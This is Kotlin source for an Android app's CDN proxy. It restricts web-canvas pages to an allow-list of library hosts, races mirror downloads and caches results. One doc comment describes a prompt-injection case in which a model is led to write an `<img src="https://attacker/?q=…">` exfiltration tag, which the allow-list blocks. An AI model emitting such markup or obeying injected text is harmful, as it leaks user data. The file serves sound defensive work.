package com.molagpt.app.feature.webview

import android.content.Context
import android.net.Uri
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Dns
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.File
import java.io.IOException
import java.net.Inet4Address
import java.security.MessageDigest
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

internal class CdnResponse(val body: ByteArray, val contentType: String)

/**
 * 替网页去 CDN 取库。三个理由让它经过我们而不是由浏览器直连（同桌面端 CdnProxy）：
 *  - 可达：jsDelivr、unpkg 在国内慢到不可用（桌面端实测 1MB 的 echarts 从 jsDelivr 12 秒没下完，
 *    npmmirror 0.5 秒）。每个请求同时向原地址和提供同样包路径的镜像发出，谁先完整返回用谁——
 *    海外用户什么也不损失，国内用户拿到镜像。
 *  - 缓存：成功的内容落盘，上周生成的页面离线也能打开。
 *  - 唯一关口：白名单只在这里和 CSP 里。
 *
 * 镜像选大型、可追责的运营方。刻意不用 BootCDN / Staticfile：它们卷入了 2024 年 polyfill.io
 * 供应链事件。
 */
internal object CanvasCdn {
    /**
     * 网页能加载的主机。其余一律拒绝，图片也不例外——被注入文字诱导写出
     * `<img src="https://attacker/?q=…">` 的模型不能真把它发出去。
     */
    val allowedHosts = listOf(
        "cdn.jsdelivr.net", "fastly.jsdelivr.net", "gcore.jsdelivr.net",
        "unpkg.com", "cdnjs.cloudflare.com", "esm.sh", "cdn.tailwindcss.com",
        "registry.npmmirror.com", "cdn.npmmirror.com", "lib.baomitu.com",
        "fonts.googleapis.com", "fonts.gstatic.com",
    )

    private const val MAX_BODY = 24L * 1024 * 1024
    // 手机存储比桌面紧，预算取桌面端 256MB 的四分之一；放在 cache 目录，系统需要时可以清掉。
    private const val CACHE_BUDGET = 64L * 1024 * 1024
    private const val RACE_TIMEOUT_MS = 40_000L

    private val trimmed = AtomicBoolean(false)

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            // IPv4 优先。npmmirror 的解析结果 IPv6 在前，IPv6 不通的网络（部分 Wi-Fi、模拟器）上
            // OkHttp 4 会先在 IPv6 上等满连接超时才换 IPv4：实测镜像 0.5 秒的下载拖到十几秒，
            // 反被最慢的 jsDelivr 抢先。只有 IPv6 地址的网络不受影响，排序不丢地址。
            .dns(object : Dns {
                override fun lookup(hostname: String) =
                    Dns.SYSTEM.lookup(hostname).sortedBy { if (it is Inet4Address) 0 else 1 }
            })
            .connectTimeout(8, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .callTimeout(40, TimeUnit.SECONDS)
            .followRedirects(true)
            .build()
    }

    fun isAllowed(host: String): Boolean = host.lowercase() in allowedHosts

    suspend fun fetch(context: Context, uri: Uri): CdnResponse? = withContext(Dispatchers.IO) {
        val dir = File(context.cacheDir, "canvas-cdn")
        val key = hash(uri.toString())
        read(dir, key)?.let { return@withContext it }

        val calls = candidates(uri).mapNotNull(::newCall)
        try {
            val winner = withTimeoutOrNull(RACE_TIMEOUT_MS) {
                coroutineScope {
                    val results = Channel<CdnResponse?>(calls.size)
                    calls.forEach { call -> launch { results.send(read(call)) } }
                    repeat(calls.size) {
                        val result = results.receive()
                        // 先到先用。输家要当场取消：已经拿到响应头的那个正阻塞在读正文上，
                        // 不取消的话这里要等它慢慢读完（国内的 jsDelivr 一读就是十几秒）才返回。
                        if (result != null) {
                            calls.forEach { it.cancel() }
                            return@coroutineScope result
                        }
                    }
                    null
                }
            }
            winner?.also { write(dir, key, it) }
        } finally {
            calls.forEach { it.cancel() }
        }
    }

    /**
     * 先原地址，再是用另一种路径提供同一文件的镜像。只做无歧义的映射：不带文件路径的裸包地址
     * 在不同 CDN 上会解析到不同的入口文件，所以不镜像。
     */
    private fun candidates(uri: Uri): List<String> {
        val out = mutableListOf(uri.toString())
        val host = uri.host?.lowercase().orEmpty()
        val path = uri.encodedPath.orEmpty()
        val query = uri.encodedQuery?.let { "?$it" }.orEmpty()
        val jsdelivr = host == "cdn.jsdelivr.net" || host == "fastly.jsdelivr.net" || host == "gcore.jsdelivr.net"

        if (jsdelivr && path.startsWith("/npm/")) {
            val npm = splitPackage(path.removePrefix("/npm/"))
            if (npm != null) {
                out += "https://registry.npmmirror.com/${npm.first}/${npm.second}/files/${npm.third}$query"
                out += "https://unpkg.com/${npm.first}@${npm.second}/${npm.third}$query"
            } else if ('+' !in path) {
                // 裸包地址：unpkg 挑选浏览器构建的方式和 jsDelivr 对几乎所有库都一致。
                out += "https://unpkg.com/" + path.removePrefix("/npm/") + query
            }
        } else if (host == "unpkg.com") {
            splitPackage(path.trimStart('/'))?.let { (name, version, file) ->
                out += "https://registry.npmmirror.com/$name/$version/files/$file"
                out += "https://cdn.jsdelivr.net/npm/$name@$version/$file"
            }
        } else if (host == "cdnjs.cloudflare.com" && path.startsWith("/ajax/libs/")) {
            out += "https://lib.baomitu.com/" + path.removePrefix("/ajax/libs/") + query
        }
        return out
    }

    /** "echarts@5.5.1/dist/echarts.min.js" 或 "@antv/g2@5/dist/g2.min.js" → (包名, 版本, 文件)。 */
    private fun splitPackage(spec: String): Triple<String, String, String>? {
        val segments = spec.split('/')
        val nameSegments = if (spec.startsWith('@')) 2 else 1
        if (segments.size <= nameSegments) return null
        val head = segments.take(nameSegments).joinToString("/")
        val file = segments.drop(nameSegments).joinToString("/")
        if (file.isEmpty() || '+' in file || file.endsWith('/')) return null
        val at = head.lastIndexOf('@')
        val name = if (at > 0) head.substring(0, at) else head
        val version = (if (at > 0) head.substring(at + 1) else "").ifEmpty { "latest" }
        return Triple(name, version, file)
    }

    private fun newCall(url: String): Call? = runCatching {
        client.newCall(
            Request.Builder()
                .url(url)
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) MolaGPT-Canvas/1.0")
                .build(),
        )
    }.getOrNull()

    private suspend fun read(call: Call): CdnResponse? {
        val url = call.request().url.toString()
        return try {
            call.await().use { response ->
                if (response.code != 200) return null
                val body = response.body ?: return null
                if (body.contentLength() > MAX_BODY) return null
                val bytes = body.bytes()
                if (bytes.size > MAX_BODY) return null
                val type = body.contentType()?.toString()?.takeIf { it.isNotBlank() } ?: guessType(url)
                CdnResponse(bytes, type)
            }
        } catch (_: IOException) {
            null
        }
    }

    private suspend fun Call.await(): Response = suspendCancellableCoroutine { continuation: CancellableContinuation<Response> ->
        continuation.invokeOnCancellation { runCatching { cancel() } }
        enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                // 已被取消（别的镜像先到了）时把响应关掉，不留连接。
                continuation.resume(response) { response.close() }
            }
            override fun onFailure(call: Call, e: IOException) {
                if (continuation.isActive) continuation.resumeWith(Result.failure(e))
            }
        })
    }

    private fun guessType(url: String): String = when (url.substringBefore('?').substringAfterLast('.', "").lowercase()) {
        "js", "mjs", "cjs" -> "application/javascript; charset=utf-8"
        "css" -> "text/css; charset=utf-8"
        "json" -> "application/json; charset=utf-8"
        "wasm" -> "application/wasm"
        "svg" -> "image/svg+xml"
        "woff2" -> "font/woff2"
        "woff" -> "font/woff"
        "ttf" -> "font/ttf"
        "png" -> "image/png"
        else -> "application/octet-stream"
    }

    // ---- 磁盘缓存 ----

    private fun read(dir: File, key: String): CdnResponse? = runCatching {
        val body = File(dir, "$key.bin")
        val type = File(dir, "$key.type")
        if (!body.exists() || !type.exists()) return null
        body.setLastModified(System.currentTimeMillis())
        CdnResponse(body.readBytes(), type.readText())
    }.getOrNull()

    private fun write(dir: File, key: String, response: CdnResponse) {
        runCatching {
            dir.mkdirs()
            val body = File(dir, "$key.bin")
            val temp = File(dir, "$key.tmp")
            temp.writeBytes(response.body)
            if (!temp.renameTo(body)) {
                body.delete()
                temp.renameTo(body)
            }
            File(dir, "$key.type").writeText(response.contentType)
            if (trimmed.compareAndSet(false, true)) trim(dir)
        }
    }

    /** 每次运行只做一次：超出预算时按最近使用时间删掉最旧的。 */
    private fun trim(dir: File) {
        val files = dir.listFiles { f -> f.name.endsWith(".bin") }?.sortedByDescending { it.lastModified() } ?: return
        var total = 0L
        for (file in files) {
            total += file.length()
            if (total <= CACHE_BUDGET) continue
            file.delete()
            File(dir, file.name.removeSuffix(".bin") + ".type").delete()
        }
    }

    private fun hash(value: String): String =
        MessageDigest.getInstance("SHA-256").digest(value.toByteArray()).joinToString("") { "%02x".format(it) }.take(32)
}
